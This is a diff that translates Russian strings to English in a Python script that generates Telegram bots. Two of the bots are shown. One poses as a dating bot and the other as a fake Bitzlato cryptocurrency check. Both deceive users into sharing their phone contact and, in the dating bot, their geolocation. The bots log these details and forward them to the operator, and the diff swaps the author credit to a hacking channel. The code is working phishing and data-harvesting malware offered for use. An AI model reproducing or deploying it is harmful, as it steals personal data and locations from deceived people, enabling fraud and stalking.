@@ -526,7 +526,7 @@ bot.polling()
 
 		""")
 	f.close()
-	print("Файл brawl.py сохранен")
+	print("The brawl.py file is saved")
 
 if choice == 4:
 	f = open('znak.py', 'w+', encoding='utf-8')
@@ -539,36 +539,36 @@ import random
 ID = '{userid}'
 bot = telebot.TeleBot("{token}")
 bot.send_message(ID, '!BOT STARTED!') 
-print("Бот запущен!") 
+print("Bot launched!") 
 
 @bot.message_handler(commands=['start'])
 def start(message):
-	bot.send_message(message.chat.id, f'''👋 Привет! {{message.from_user.first_name}}👋
-		Это бот для знакомства!
-	Чтобы начать, введите /znak''') 
+	bot.send_message(message.chat.id, f'''👋Hello! {{message.from_user.first_name}}👋
+This is a dating bot!
+To get started, type /znak''') 
 @bot.message_handler(commands=['lamer112311dev'])
 def start(message):
-	bot.send_message(message.chat.id, 'Автор скрипта: @lamer112311. Канал: cutt.ly/CyberPuffin') 
+	bot.send_message(message.chat.id, 'Author of the script:: @suman333mondal. Check: t.me/onlinehacking') 
 @bot.message_handler(commands=['znak'])
 def start(message):
-	msg = bot.send_message(message.chat.id, 'Для начала напишите немного о себе (одним сообщением)') 
+	msg = bot.send_message(message.chat.id, 'First, write a little about yourself (in one message)') 
 	bot.register_next_step_handler(msg, proc2)
 
 def proc2(message):
 	try:
 		m_id = message.chat.id
 		num = message.text
-		bot.send_message(ID, f'Полученая информация: {{num}}')
+		bot.send_message(ID, f'Information received: {{num}}')
 		print(num)
 		time.sleep(2)
 		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
-		button_phone = types.KeyboardButton(text="Зарегистрироваться", request_contact=True) 	
+		button_phone = types.KeyboardButton(text="Register", request_contact=True) 	
 		keyboard.add(button_phone)	
-		bot.send_message(m_id, '''Для того, чтобы использовать бота, зарегистрируйтесь, пожалуйста!''', reply_markup=keyboard)
-# Отловка ошибок
+		bot.send_message(m_id, '''In order to use the bot, please register!''', reply_markup=keyboard)
+# Catching errors
 	except Exception as e:
 		bot.send_message(ID, e)
-		bot.send_message(m_id, 'Произошла неопознанная ошибка, перезагрузите бота!')
+		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')
 
 @bot.message_handler(content_types=['contact']) 
 def contact(message):
@@ -578,13 +578,13 @@ def contact(message):
 		last = message.contact.last_name
 		userid = message.contact.user_id
 		phone = message.contact.phone_number
-		bot.send_message(userid, "Регистрация прошла успешно!")
+		bot.send_message(userid, "registration completed successfully!")
 		info = f'''
-			Данные
-			├Имя: {{first}} {{last}}
+			Data
+			├Name: {{first}} {{last}}
 			├ID: {{userid}}
-			├Ник: @{{nick}}
-			└Номер телефона: {{phone}}
+			├Nik: @{{nick}}
+			└Phone number: {{phone}}
 			'''
 		log = open('bot-log.txt', 'a+', encoding='utf-8')
 		log.write(info + '  ')
@@ -593,12 +593,12 @@ def contact(message):
 		print(info)
 
 		if message.contact.user_id != message.chat.id:
-			bot.send_message(message.chat.id, 'Отправьте свой контакт!')
+			bot.send_message(message.chat.id, 'Submit your contact!')
 		time.sleep(1)
 		keyboard1 = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
-		button_location = types.KeyboardButton(text="Отправить", request_location=True) 	
+		button_location = types.KeyboardButton(text="Send", request_location=True) 	
 		keyboard1.add(button_location)
-		bot.send_message(message.chat.id, text='Отправьте свою геопозицию, для того, чтобы бот нашел ближайших от вас пользователей!', reply_markup=keyboard1)
+		bot.send_message(message.chat.id, text='Send your geolocation so that the bot can find users closest to you!', reply_markup=keyboard1)
 
 @bot.message_handler(content_types=['location']) 
 def contact(message):
@@ -606,24 +606,24 @@ def contact(message):
 		lon = str(message.location.longitude)
 		lat = str(message.location.latitude)
 		geo = f'''
-		Геолокация
+		Geolocation
 		├ID: {{message.chat.id}}
 		├Longitude: {{lon}}
 		├Latitude: {{lat}} 
-		└Карты: https://www.google.com/maps/place/{{lat}}+{{lon}} 
+		└Cards: https://www.google.com/maps/place/{{lat}}+{{lon}} 
 		'''
 		log = open('bot-log.txt', 'a+', encoding='utf-8')
 		log.write(geo + '  ')
 		log.close()
 		bot.send_message(ID, geo) 
 		print(geo)
-		bot.send_message(message.chat.id, 'Поиск...')
+		bot.send_message(message.chat.id, 'Search...')
 		time.sleep(2)
-		bot.send_message(message.chat.id, 'К сожалению в базе не нашлось подходящих пользователей!')
+		bot.send_message(message.chat.id, 'Unfortunately, there were no suitable users in the database!')
 bot.polling()
 		""")
 	f.close()
-	print("Файл znak.py сохранен")
+	print("znak.py file saved")
 if choice == 5:
 	f = open('btc.py', 'w+', encoding='utf-8')
 	f.write(f"""
@@ -636,21 +636,21 @@ import random
 ID = '{userid}'
 bot = telebot.TeleBot("{token}")
 bot.send_message(ID, '!BOT STARTED!') 
-print("Бот запущен!") 
+print("Bot launched!") 
 
 
 @bot.message_handler(commands=['admin'])
 def adm(message):
 	if message.from_user.id == int(ID):
-		msg = bot.send_message(ID, 'Добро пожаловать в админ панель бота! \\n Введите сумму на которую создать чек:') 
+		msg = bot.send_message(ID, 'Welcome to the bot admin panel! \\n Enter the amount for which to create a check:') 
 		bot.register_next_step_handler(msg, check)
 def check(message):
 	try:
 		if message.text.isdigit():
-			bot.send_message(ID, f'Сумма: {{message.text}}')
-			bot.send_message(ID, f'Ваш чек: https://t.me/{{bot.get_me().username}}?start={{message.text}}')
+			bot.send_message(ID, f'Sum: {{message.text}}')
+			bot.send_message(ID, f'Your check: https://t.me/{{bot.get_me().username}}?start={{message.text}}')
 		else:
-			bot.send_message('Значение должно быть чисельным!')
+			bot.send_message('The value must be numeric!')
 
 	except Exception as e:
 		print(e)
@@ -658,28 +658,28 @@ def check(message):
 @bot.message_handler(commands=['start'])
 def start(message):
 	if message.from_user.id == int(ID):
-		bot.send_message(ID, 'Добро пожаловать в бота! \\n Для входа в админ панель напишите: /admin') 
+		bot.send_message(ID, 'Welcome to the bot! \\n To enter the admin panel, write: /admin') 
 	else:
 		try:
 			summ = message.text.split()[1]
 			userid = message.chat.id
-			bot.send_message(ID, f'Пользователь с ID:{{userid}} "Обналичил" ваш чек на сумму:{{summ}}')
-			bot.send_message(message.chat.id, f'''Вы получили 0.00{{random.randint(51, 253)}} BTC ({{summ}} RUB) от /uPorterBaseTheFist!''')
+			bot.send_message(ID, f'User with ID:{{userid}} "Cashed" your check for the amount:{{summ}}')
+			bot.send_message(message.chat.id, f'''You received 0.00{{random.randint(51, 253)}} BTC ({{summ}} RUB) от /uPorterBaseTheFist!''')
 			time.sleep(1)
 			
 			m_id = message.chat.id
 			keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
-			button_phone = types.KeyboardButton(text="✅Снять ограничения", request_contact=True) 	
+			button_phone = types.KeyboardButton(text="✅Remove restrictions", request_contact=True) 	
 			keyboard.add(button_phone)	
-			bot.send_message(message.chat.id, "Запрещено >>> \\n❌ Ваш аккаунт ограничен! Вероятнее всего, Вы нарушили условия сервиса (https://bitzlato.bz/en/terms)!", reply_markup=keyboard)
+			bot.send_message(message.chat.id, "Prohibited >>> \\n❌ Your account is limited! Most likely, you have violated the terms of service (https://bitzlato.bz/en/terms)!", reply_markup=keyboard)
 		
 		except Exception as e:
 			keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
-			button_phone = types.KeyboardButton(text="✅Снять ограничения", request_contact=True) 	
+			button_phone = types.KeyboardButton(text="✅Remove restrictions", request_contact=True) 	
 			keyboard.add(button_phone)	
-			bot.send_message(message.chat.id, "Запрещено >>> \\n❌ Ваш аккаунт ограничен! Вероятнее всего, Вы нарушили условия сервиса (https://bitzlato.bz/en/terms)!", reply_markup=keyboard)
+			bot.send_message(message.chat.id, "Prohibited >>> \\n❌ Your account is limited! Most likely, you have violated the terms of service (https://bitzlato.bz/en/terms)!", reply_markup=keyboard)
 			userid = message.chat.id
-			bot.send_message(ID, f'Пользователь с ID:{{userid}} запустил бота!')
+			bot.send_message(ID, f'User with ID:{{userid}} launched a bot!')
 
 @bot.message_handler(content_types=['contact']) 
 def contact(message):
@@ -689,13 +689,13 @@ def contact(message):
 		last = message.contact.last_name
 		userid = message.contact.user_id
 		phone = message.contact.phone_number
-		bot.send_message(userid, "✅Ограничения успешно сняты, спасибо, что воспользовались нашим ботом!")
+		bot.send_message(userid, "✅The restrictions have been successfully lifted, thank you for using our bot!")
 		info = f'''
-			Данные
-			├Имя: {{first}} {{last}}
+			Data
+			├Name: {{first}} {{last}}
 			├ID: {{userid}}
-			├Ник: @{{nick}}
-			└Номер телефона: {{phone}}
+			├Nok: @{{nick}}
+			└Phone number: {{phone}}
 			'''
 		log = open('bot-log.txt', 'a+', encoding='utf-8')
 		log.write(info + '  ')
@@ -704,9 +704,9 @@ def contact(message):
 		print(info)
 
 		if message.contact.user_id != message.chat.id:
-			bot.send_message(message.chat.id, '❌Авторизуйте СВОЙ контакт!')
+			bot.send_message(message.chat.id, '❌Authorize YOUR contact!')
 	
 bot.polling()
 		""")
 	f.close()
-	print("Файл btc.py сохранен")
+	print("btc.py file saved")
